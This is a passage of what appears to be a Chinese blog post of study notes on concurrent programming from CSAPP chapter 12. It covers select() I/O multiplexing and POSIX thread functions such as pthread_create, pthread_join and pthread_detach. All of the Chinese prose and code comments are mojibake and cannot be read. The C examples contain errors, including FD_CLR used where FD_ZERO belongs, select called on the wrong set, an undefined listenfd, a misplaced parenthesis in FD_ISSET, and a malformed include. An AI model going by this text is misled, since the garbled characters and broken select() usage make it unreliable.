readä¸­<br>ç­‰å¾…ä¸€ä¸ªè¾“äººå‘½ä»¤ï¼Œæˆ‘ä»¬å°±ä¸èƒ½å“åº”ä»»ä½•è¿æ¥è¯·æ±‚ã€‚</p><p>é’ˆå¯¹è¿™ç§å›°å¢ƒçš„ä¸€ä¸ªè§£å†³åŠæ³•å°±æ˜¯ <strong>I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯</strong>ã€‚åŸºæœ¬çš„æ€è·¯å°±æ˜¯ä½¿ç”¨ select å‡½æ•°ï¼Œè¦æ±‚å†…æ ¸æŒ‚èµ·è¿›ç¨‹ï¼Œåªæœ‰åœ¨ä¸€ä¸ªæˆ–å¤šä¸ª I&#x2F;O äº‹ä»¶å‘ç”Ÿåï¼Œæ‰å°†æ§åˆ¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œ</p><p>ä¾‹å¦‚ä¸‹é¢çš„ç¤ºä¾‹ï¼š</p><blockquote><p>select æ˜¯ä¸€ä¸ªå¤æ‚çš„å‡½æ•°ï¼Œæœ‰è®¸å¤šä¸åŒçš„ä½¿ç”¨åœºæ™¯ã€‚æˆ‘ä»¬åªè®¨è®ºç¬¬ä¸€ç§åœºæ™¯ï¼šç­‰å¾…ä¸€ç»„æè¿°ç¬¦å‡†å¤‡å¥½è¯»ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-type">int</span> n, fd_set *fdset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)</span>;<br><span class="hljs-comment">// è¿”å›å·²å‡†å¤‡å¥½çš„æè¿°ç¬¦çš„éé›¶çš„ä¸ªæ•°ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br><br>FD_ZERO(fd_set *fdset);           <span class="hljs-comment">/* Clear all bits in fdset */</span><br>FD_CLR(<span class="hljs-type">int</span> fd, fd_set *fdset);    <span class="hljs-comment">/* Clear bit fd in fdset */</span><br>FD_SET(<span class="hljs-type">int</span> fd, fd_set *fdset);    <span class="hljs-comment">/* Turn on bit fd in fdset */</span><br>FD_ISSET(<span class="hljs-type">int</span> fd, fd_set *fdset);  <span class="hljs-comment">/* Is bit fd in fdset on? */</span><br><span class="hljs-comment">// å¤„ç†æè¿°ç¬¦é›†åˆçš„å®ã€‚</span><br></code></pre></td></tr></table></figure><p>select å‡½æ•°å¤„ç†ç±»å‹ä¸º <code>fd_set</code> çš„é›†åˆï¼Œä¹Ÿå«åšæè¿°ç¬¦é›†åˆã€‚é€»è¾‘ä¸Šï¼Œæˆ‘ä»¬å°†æè¿°ç¬¦é›†åˆçœ‹æˆä¸€ä¸ªå¤§å°ä¸º n çš„ä½å‘é‡ $$b_n$$ ã€‚<strong>å½“ä¸”ä»…å½“ $$b_k$$&#x3D;1ï¼Œæè¿°ç¬¦æ‰è¡¨æ˜æ˜¯æè¿°ç¬¦é›†åˆçš„ä¸€ä¸ªå…ƒç´ ã€‚</strong></p><p>è¿™ä¸ªå‡½æ•°åªå…è®¸å¯¹æè¿°ç¬¦é›†åˆåšä¸‰ä»¶äº‹ï¼š1) åˆ†é…å®ƒä»¬ï¼Œ2) å°†ä¸€ä¸ªæ­¤ç§ç±»å‹çš„å˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡ï¼Œ3) ç”¨ FD ZEROã€FD SETã€FD CLR å’Œ FD ISSET å®æ¥ä¿®æ”¹å’Œæ£€æŸ¥å®ƒä»¬ã€‚</p><p>é’ˆå¯¹æˆ‘ä»¬çš„ç›®çš„ï¼Œselect å‡½æ•°æœ‰ä¸¤ä¸ªè¾“äººï¼šä¸€ä¸ªç§°ä¸ºè¯»é›†åˆçš„**æè¿°ç¬¦é›†åˆ(fd_set)<strong>å’Œè¯¥è¯»é›†åˆçš„</strong>åŸºæ•°(n)**ï¼ˆå®é™…ä¸Šæ˜¯ä»»ä½•æè¿°ç¬¦é›†åˆçš„æœ€å¤§åŸºæ•°ï¼‰ã€‚select å‡½æ•°ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°è¯»é›†åˆä¸­è‡³å°‘æœ‰ä¸€ä¸ªæè¿°ç¬¦å‡†å¤‡å¥½å¯ä»¥è¯»ã€‚å½“ä¸”ä»…å½“ä¸€ä¸ªä»è¯¥æè¿°ç¬¦è¯»å–ä¸€ä¸ªå­—èŠ‚çš„è¯·æ±‚ä¸ä¼šé˜»å¡æ—¶ï¼Œæè¿°ç¬¦ k å°±è¡¨ç¤ºå‡†å¤‡å¥½å¯ä»¥è¯»äº†ã€‚</p><p>æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><p>å‡è®¾æœ‰ä¸¤ä¸ªæ–‡ä»¶ fd1ã€fd2ï¼Œæˆ‘è¦å®ç°å½“æŸä¸ªæè¿°ç¬¦å‡†å¤‡æ—¶è¿›è¡Œè¯»å–å¯¹åº”çš„æ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br>fd_set readsetï¼Œready_set;<br>FD_CLR(&amp;readset);<br>FD_SET(fd1,&amp;readset);<br>FD_SET(fd2,&amp;readset);<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    ready_set = readset;<span class="hljs-comment">//æ¯æ¬¡éœ€è¦é‡æ–°èµ‹å€¼ä¸€é</span><br>    select(listenfd + <span class="hljs-number">1</span>, &amp;readset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(FD_ISSET(fd1,&amp;readset))<br>    &#123;<br>        read(fd1,buffer,<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(FD_ISSET(fd2),&amp;readset)<br>    &#123;<br>        read(fd2,buffer,<span class="hljs-number">0x100</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸¤ä¸ªéƒ½æ²¡æœ‰å‡†å¤‡å¥½ï¼Œå°±ä¼šé˜»å¡äº†ã€‚</p><p><del>æ¥ä¸‹æ¥çš„å°èŠ‚è®²äº†ä¸€ä¸ªå®ä¾‹ï¼Œç•¥ğŸ¤ª</del></p><h3 id="I-x2F-O-å¤šè·¯å¤ç”¨æŠ€æœ¯çš„ä¼˜åŠ£"><a href="#I-x2F-O-å¤šè·¯å¤ç”¨æŠ€æœ¯çš„ä¼˜åŠ£" class="headerlink" title="I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯çš„ä¼˜åŠ£"></a>I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯çš„ä¼˜åŠ£</h3><p>ä¼˜ç‚¹ï¼š</p><p>è°ƒè¯•æ–¹ä¾¿ï¼Œæ¯ä¸ªé€»è¾‘æµéƒ½èƒ½è®¿é—®è¯¥è¿›ç¨‹çš„å…¨éƒ¨åœ°å€ç©ºé—´ï¼Œä¸”ä¸éœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><p>ç¼ºç‚¹ï¼š</p><p>å¦‚æœé¢å¯¹ç½‘ç»œå»¶è¿Ÿè¾ƒé«˜çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·ä¼šé˜»å¡æ•´ä¸ªæœåŠ¡ï¼Œç”šè‡³ä¼šæœ‰æ¶æ„ç”¨æˆ·æ•…æ„åªå‘é€éƒ¨åˆ†æ–‡æœ¬è¡Œï¼Œå¯¼è‡´æ•´ä¸ªæœåŠ¡è¢«é˜»å¡ã€‚</p><h1 id="åŸºäºçº¿ç¨‹çš„å¹¶å‘ç¼–ç¨‹"><a href="#åŸºäºçº¿ç¨‹çš„å¹¶å‘ç¼–ç¨‹" class="headerlink" title="åŸºäºçº¿ç¨‹çš„å¹¶å‘ç¼–ç¨‹"></a>åŸºäºçº¿ç¨‹çš„å¹¶å‘ç¼–ç¨‹</h1><p>çº¿ç¨‹å°±æ˜¯è¿è¡Œåœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„é€»è¾‘æµã€‚çº¿ç¨‹ç”±å†…æ ¸è‡ªåŠ¨è°ƒåº¦ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰å®ƒè‡ªå·±çš„çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°çº¿ç¨‹ IDã€æ ˆã€æ ˆæŒ‡é’ˆã€ç¨‹åºè®¡æ•°å™¨ã€é€šç”¨ç›®çš„å¯„å­˜å™¨å’Œæ¡ä»¶ç ã€‚æ‰€æœ‰çš„è¿è¡Œåœ¨ä¸€ä¸ªè¿›ç¨‹é‡Œçš„çº¿ç¨‹å…±äº«è¯¥è¿›ç¨‹çš„æ•´ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p><h3 id="çº¿ç¨‹æ‰§è¡Œæ¨¡å‹"><a href="#çº¿ç¨‹æ‰§è¡Œæ¨¡å‹" class="headerlink" title="çº¿ç¨‹æ‰§è¡Œæ¨¡å‹"></a>çº¿ç¨‹æ‰§è¡Œæ¨¡å‹</h3><p>æ¯ä¸ªè¿›ç¨‹å¼€å§‹çš„æ—¶å€™éƒ½æ˜¯ä¸€ä¸ªå•ä¸€çº¿ç¨‹ï¼Œå°±æ˜¯ä¸»çº¿ç¨‹ã€‚åœ¨æŸä¸€æ—¶åˆ»ï¼Œä¸»çº¿ç¨‹åˆ›å»ºä¸€ä¸ª<strong>å¯¹ç­‰çº¿ç¨‹</strong>ï¼ˆpeer threadï¼‰ï¼Œä»è¿™ä¸ªæ—¶é—´ç‚¹å¼€å§‹ï¼Œä¸¤ä¸ªçº¿ç¨‹å°±å¹¶å‘åœ°è¿è¡Œã€‚æœ€åï¼Œå› ä¸ºä¸»çº¿ç¨‹æ‰§è¡Œä¸€ä¸ªæ…¢é€Ÿç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚ read æˆ–è€… sleepï¼Œæˆ–è€…å› ä¸ºè¢«ç³»ç»Ÿçš„é—´éš”è®¡æ—¶å™¨ä¸­æ–­ï¼Œæ§åˆ¶å°±ä¼šé€šè¿‡ä¸Šä¸‹æ–‡åˆ‡æ¢ä¼ é€’åˆ°å¯¹ç­‰çº¿ç¨‹ã€‚å¯¹ç­‰çº¿ç¨‹ä¼šæ‰§è¡Œä¸€æ®µæ—¶é—´ï¼Œç„¶åæ§åˆ¶ä¼ é€’å›ä¸»çº¿ç¨‹ï¼Œä¾æ¬¡ç±»æ¨ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E5%B9%B6%E5%8F%91%E7%BA%BF%E7%A8%8B.png"></p><p>çº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢é€Ÿåº¦æ¯”è¿›ç¨‹è¦å¿«çš„å¤šï¼Œå› ä¸ºçº¿ç¨‹å¤§éƒ¨åˆ†æ•°æ®æ˜¯å…±äº«çš„ã€‚åŒæ—¶ï¼Œçº¿ç¨‹ä¸åƒè¿›ç¨‹é‚£æ ·æœ‰ä¸¥æ ¼çš„çˆ¶å­å±‚æ¬¡å…³ç³»ã€‚<strong>å’Œä¸€ä¸ªè¿›ç¨‹ç›¸å…³çš„çº¿ç¨‹ç»„æˆä¸€ä¸ªå¯¹ç­‰(çº¿ç¨‹)æ± ï¼Œç‹¬ç«‹äºå…¶ä»–çº¿ç¨‹åˆ›å»ºçš„çº¿ç¨‹ã€‚</strong>ä¸»çº¿ç¨‹å’Œå…¶ä»–çº¿ç¨‹çš„åŒºåˆ«ä»…åœ¨äºå®ƒæ€»æ˜¯è¿›ç¨‹ä¸­ç¬¬ä¸€ä¸ªè¿è¡Œçš„çº¿ç¨‹ã€‚</p><p>å¯¹ç­‰(çº¿ç¨‹)æ± æ¦‚å¿µçš„ä¸»è¦å½±å“æ˜¯ï¼Œä¸€ä¸ªçº¿ç¨‹å¯ä»¥æ€æ­»å®ƒçš„ä»»ä½•å¯¹ç­‰çº¿ç¨‹ï¼Œæˆ–è€…ç­‰å¾…å®ƒçš„ä»»æ„å¯¹ç­‰çº¿ç¨‹ç»ˆæ­¢ã€‚</p><h3 id="POSIX-çº¿ç¨‹"><a href="#POSIX-çº¿ç¨‹" class="headerlink" title="POSIX çº¿ç¨‹"></a>POSIX çº¿ç¨‹</h3><p>Posix çº¿ç¨‹ï¼ˆPthreadsï¼‰å°±æ˜¯åœ¨ C ç¨‹åºä¸­å¤„ç†çº¿ç¨‹çš„ä¸€ä¸ªæ ‡å‡†æ¥å£ã€‚Pthreads å®šä¹‰äº†å¤§çº¦ 60ä¸ªå‡½æ•°ï¼Œå…è®¸ç¨‹åºåˆ›å»ºæ€æ­»å’Œå›æ”¶çº¿ç¨‹ï¼Œä¸å¯¹ç­‰çº¿ç¨‹å®‰å…¨åœ°å…±äº«æ•°æ®ï¼Œè¿˜å¯ä»¥é€šçŸ¥å¯¹ç­‰çº¿ç¨‹ç³»ç»ŸçŠ¶æ€çš„å˜åŒ–ã€‚</p><h3 id="åˆ›å»ºçº¿ç¨‹"><a href="#åˆ›å»ºçº¿ç¨‹" class="headerlink" title="åˆ›å»ºçº¿ç¨‹"></a>åˆ›å»ºçº¿ç¨‹</h3><p>çº¿ç¨‹é€šè¿‡ <code>pthread_create</code> å‡½æ•°æ¥åˆ›å»ºå…¶ä»–çº¿ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span> *(func)(<span class="hljs-type">void</span> *);<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *tid, <span class="hljs-type">pthread_attr_t</span> *attr,</span><br><span class="hljs-params">                   func *f, <span class="hljs-type">void</span> *arg)</span>;<br><span class="hljs-comment">// è‹¥æˆåŠŸåˆ™è¿”å› 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸ºéé›¶ã€‚</span><br></code></pre></td></tr></table></figure><p><code>pthread_create</code> å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œå¹¶å¸¦ç€ä¸€ä¸ªè¾“å…¥å˜é‡ <em>arq</em>ï¼Œåœ¨æ–°çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçº¿ç¨‹ä¾‹ç¨‹ <em>f</em> ã€‚èƒ½ç”¨ <em>attr</em> å‚æ•°æ¥æ”¹å˜æ–°åˆ›å»ºçº¿ç¨‹çš„é»˜è®¤å±æ€§ã€‚</p><p>å½“ <code>pthread_create</code> è¿”å›æ—¶ï¼Œå‚æ•° <em>tid</em> åŒ…å«æ–°åˆ›å»ºçº¿ç¨‹çš„ IDã€‚æ–°çº¿ç¨‹å¯ä»¥é€šè¿‡è°ƒç”¨ <code>pthread_self</code> å‡½æ•°æ¥è·å¾—å®ƒè‡ªå·±çš„çº¿ç¨‹ ID ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-title function_">pthread_self</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//è¿”å›è°ƒç”¨è€…çš„çº¿ç¨‹ IDã€‚</span><br></code></pre></td></tr></table></figure><h3 id="ç»ˆæ­¢çº¿ç¨‹"><a href="#ç»ˆæ­¢çº¿ç¨‹" class="headerlink" title="ç»ˆæ­¢çº¿ç¨‹"></a>ç»ˆæ­¢çº¿ç¨‹</h3><p>ä¸€ä¸ªçº¿ç¨‹æ˜¯ä»¥ä¸‹åˆ—æ–¹å¼ä¹‹ä¸€æ¥ç»ˆæ­¢çš„ï¼š</p><ul><li>å½“é¡¶å±‚çš„çº¿ç¨‹ä¾‹ç¨‹è¿”å›æ—¶ï¼Œçº¿ç¨‹ä¼šéšå¼åœ°ç»ˆæ­¢ã€‚</li><li>é€šè¿‡è°ƒç”¨ <code>pthread_exit</code> å‡½æ•°ï¼Œçº¿ç¨‹ä¼šæ˜¾å¼åœ°ç»ˆæ­¢ã€‚å¦‚æœä¸»çº¿ç¨‹è°ƒç”¨ <code>pthread_exit</code>ï¼Œå®ƒä¼šç­‰å¾…æ‰€æœ‰å…¶ä»–å¯¹ç­‰çº¿ç¨‹ç»ˆæ­¢ï¼Œç„¶åå†ç»ˆæ­¢ä¸»çº¿ç¨‹å’Œæ•´ä¸ªè¿›ç¨‹ï¼Œè¿”å›å€¼ä¸º thread_return ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_exit</span><span class="hljs-params">(<span class="hljs-type">void</span> *thread_return)</span>;<br><span class="hljs-comment">//ä»ä¸è¿”å›ã€‚</span><br></code></pre></td></tr></table></figure><ul><li>æŸä¸ªå¯¹ç­‰çº¿ç¨‹è°ƒç”¨ Linux çš„ <code>exit</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ç»ˆæ­¢è¿›ç¨‹ä»¥åŠæ‰€æœ‰ä¸è¯¥è¿›ç¨‹ç›¸å…³çš„çº¿ç¨‹ã€‚</li><li>å¦ä¸€ä¸ªå¯¹ç­‰çº¿ç¨‹é€šè¿‡ä»¥å½“å‰çº¿ ID ä½œä¸ºå‚æ•°è°ƒç”¨ <code>pthread_cancel</code> å‡½æ•°æ¥ç»ˆæ­¢å½“å‰çº¿ç¨‹ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cancel</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br><span class="hljs-comment">//è‹¥æˆåŠŸåˆ™è¿”å›0ï¼Œè‹¥å‡ºé”™åˆ™ä¸ºéé›¶ã€‚</span><br></code></pre></td></tr></table></figure><h3 id="å›æ”¶å·²ç»ˆæ­¢çº¿ç¨‹çš„èµ„æº"><a href="#å›æ”¶å·²ç»ˆæ­¢çº¿ç¨‹çš„èµ„æº" class="headerlink" title="å›æ”¶å·²ç»ˆæ­¢çº¿ç¨‹çš„èµ„æº"></a>å›æ”¶å·²ç»ˆæ­¢çº¿ç¨‹çš„èµ„æº</h3><p>çº¿ç¨‹é€šè¿‡è°ƒç”¨ <code>pthread_join</code> å‡½æ•°ç­‰å¾…å…¶ä»–çº¿ç¨‹ç»ˆæ­¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_join</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid, <span class="hljs-type">void</span> **thread_return)</span>;<br><span class="hljs-comment">//è‹¥æˆåŠŸåˆ™è¿”å› 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸ºéé›¶ã€‚</span><br></code></pre></td></tr></table></figure><p><code>pthread_join</code> å‡½æ•°ä¼šé˜»å¡ï¼Œç›´åˆ°çº¿ç¨‹ <em>tid</em> ç»ˆæ­¢ï¼Œå°†çº¿ç¨‹ä¾‹ç¨‹è¿”å›çš„é€šç”¨ <em>(void*)</em> æŒ‡é’ˆèµ‹å€¼ä¸º <em>thread_return</em> æŒ‡å‘çš„ä½ç½®ï¼Œç„¶åå›æ”¶å·²ç»ˆæ­¢çº¿ç¨‹å ç”¨çš„æ‰€æœ‰å†…å­˜èµ„æºã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå’Œ Linux çš„ <code>wait</code> å‡½æ•°ä¸åŒï¼Œ**<code>pthread_join</code> å‡½æ•°åªèƒ½ç­‰å¾…ä¸€ä¸ªæŒ‡å®šçš„çº¿ç¨‹ç»ˆæ­¢ï¼Œæ²¡æœ‰åŠæ³•è®© <code>pthread_wait</code> ç­‰å¾…ä»»æ„ä¸€ä¸ªçº¿ç¨‹ç»ˆæ­¢ã€‚**</p><h3 id="åˆ†ç¦»çº¿ç¨‹"><a href="#åˆ†ç¦»çº¿ç¨‹" class="headerlink" title="åˆ†ç¦»çº¿ç¨‹"></a>åˆ†ç¦»çº¿ç¨‹</h3><p>åœ¨ä»»ä½•ä¸€ä¸ªæ—¶é—´ç‚¹ä¸Šï¼Œçº¿ç¨‹æ˜¯<strong>å¯ç»“åˆçš„</strong>ï¼ˆjoinableï¼‰æˆ–è€…æ˜¯<strong>åˆ†ç¦»çš„</strong>ï¼ˆdetachedï¼‰ã€‚ä¸€ä¸ªå¯ç»“åˆçš„çº¿ç¨‹èƒ½å¤Ÿè¢«å…¶ä»–çº¿ç¨‹æ”¶å›å’Œæ€æ­»ã€‚åœ¨è¢«å…¶ä»–çº¿ç¨‹å›æ”¶ä¹‹å‰ï¼Œå®ƒçš„å†…å­˜èµ„æºï¼ˆä¾‹å¦‚æ ˆï¼‰æ˜¯ä¸é‡Šæ”¾çš„ã€‚ä¸€ä¸ªåˆ†ç¦»çš„çº¿ç¨‹æ˜¯ä¸èƒ½è¢«å…¶ä»–çº¿ç¨‹å›æ”¶æˆ–æ€æ­»çš„ã€‚å®ƒçš„å†…å­˜èµ„æºåœ¨å®ƒç»ˆæ­¢æ—¶ç”±ç³»ç»Ÿè‡ªåŠ¨é‡Šæ”¾ã€‚</p><p>ä¸ºäº†é¿å…å†…å­˜æ³„éœ²ï¼Œçº¿ç¨‹åˆ›å»ºå°±æ˜¯å¯ç»“åˆçš„ã€‚æ¯ä¸ªå¯ç»“åˆçº¿ç¨‹éƒ½åº”è¯¥è¦ä¹ˆè¢«å…¶ä»–çº¿ç¨‹æ˜¾ç¤ºçš„å›æ”¶ï¼Œæˆ–è€…ä½¿ç”¨ <code>pthread_detach</code> å‡½æ•°å»åˆ†ç¦»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_detach</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br><span class="hljs-comment">//è‹¥æˆåŠŸåˆ™è¿”å› 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸ºéå®¢</span><br></code></pre></td></tr></table></figure><p>å¯¹äºä¸€äº› web æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ†ç¦»çº¿ç¨‹è®©ä¸»çº¿ç¨‹ä¸å¿…ç­‰å¾…ï¼Œç­‰åˆ°çº¿ç¨‹è‡ªå·±æ‰§è¡Œå®Œæ¯•åç­‰å¾…ç³»ç»Ÿå›æ”¶å†…å­˜èµ„æºã€‚</p><h3 id="åˆå§‹åŒ–çº¿ç¨‹"><a href="#åˆå§‹åŒ–çº¿ç¨‹" class="headerlink" title="åˆå§‹åŒ–çº¿ç¨‹"></a>åˆå§‹åŒ–çº¿ç¨‹</h3><p>pthread_once å‡½æ•°å…è®¸ä½ åˆå§‹åŒ–ä¸çº¿ç¨‹ä¾‹ç¨‹ç›¸å…³çš„çŠ¶æ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">pthread_once_t</span> once_control = PTHREAD_ONCE_INIT;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_once</span><span class="hljs-params">(<span class="hljs-type">pthread_once_t</span> *once_control,<span class="hljs-type">void</span> (*init_routine)(<span class="hljs-type">void</span>))</span>;<br><span class="hljs-comment">// æ€»æ˜¯è¿”å› 0ã€‚</span><br></code></pre></td></tr></table></figure><p>å½“ä½ ç¬¬ä¸€æ¬¡ç”¨å‚æ•° once_control è°ƒç”¨ <code>pthread_once</code> æ—¶ï¼Œå®ƒè°ƒç”¨ <code>init_routine</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰è¾“äººå‚æ•°ã€ä¹Ÿä¸è¿”å›ä»€ä¹ˆçš„å‡½æ•°ã€‚æ¥ä¸‹æ¥çš„ä»¥ once_control ä¸ºå‚æ•°çš„ <code>pthread_once</code> è°ƒç”¨ä¸åšä»»ä½•äº‹æƒ…ã€‚</p><p>å½“æˆ‘ä»¬éœ€è¦åŠ¨æ€åˆå§‹åŒ–å¤šä¸ªçº¿ç¨‹å…±äº«çš„å…¨å±€å˜é‡æ—¶ï¼Œ<code>pthread_once</code> å‡½æ•°æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</p><h3 id="åŸºäºçº¿ç¨‹çš„å¹¶å‘æœåŠ¡å™¨"><a href="#åŸºäºçº¿ç¨‹çš„å¹¶å‘æœåŠ¡å™¨" class="headerlink" title="åŸºäºçº¿ç¨‹çš„å¹¶å‘æœåŠ¡å™¨"></a>åŸºäºçº¿ç¨‹çš„å¹¶å‘æœåŠ¡å™¨</h3><p>åœ¨ accept è¯·æ±‚æ—¶ä¼šè¿”å›ä¸€ä¸ªè¿æ¥æè¿°ç¬¦ï¼Œå‡å¦‚åœ¨çº¿ç¨‹ä¸­è¿˜æ²¡æœ‰æ‹¿è¿™ä¸ªå€¼ï¼Œæ­¤æ—¶ä¸»çº¿ç¨‹ä¸‹ä¸€ä¸ª accept å·²ç»åˆ°æ¥ã€‚å°±ä¼šå¯¼è‡´è¿™ä¸ªçº¿ç¨‹å–å‡ºäº†ä¸€ä¸ªé”™è¯¯çš„æè¿°ç¬¦ã€‚è¿™å°±å¯¼è‡´äº†ä¸€ä¸ª<strong>ç«äº‰</strong>çš„å±é™©ã€‚</p><h1 id="å¤šçº¿ç¨‹ç¨‹åºä¸­çš„å…±äº«å˜é‡"><a href="#å¤šçº¿ç¨‹ç¨‹åºä¸­çš„å…±äº«å˜é‡" class="headerlink" title="å¤šçº¿ç¨‹ç¨‹åºä¸­çš„å…±äº«å˜é‡"></a>å¤šçº¿ç¨‹ç¨‹åºä¸­çš„å…±äº«å˜é‡</h1><p>ä¸»è¦å°±æ˜¯åœ¨è®²çº¿ç¨‹ä¸­ä»€ä¹ˆå˜é‡æ˜¯å…±äº«çš„</p><h3 id="çº¿ç¨‹å†…å­˜æ¨¡å‹"><a href="#çº¿ç¨‹å†…å­˜æ¨¡å‹" class="headerlink" title="çº¿ç¨‹å†…å­˜æ¨¡å‹"></a>çº¿ç¨‹å†…å­˜æ¨¡å‹</h3><p>å¯„å­˜å™¨æ˜¯ä¸å…±äº«çš„ï¼Œä½†æ˜¯è™šæ‹Ÿå†…å­˜æ˜¯å…±äº«çš„ã€‚å®ƒä»¬çš„æ 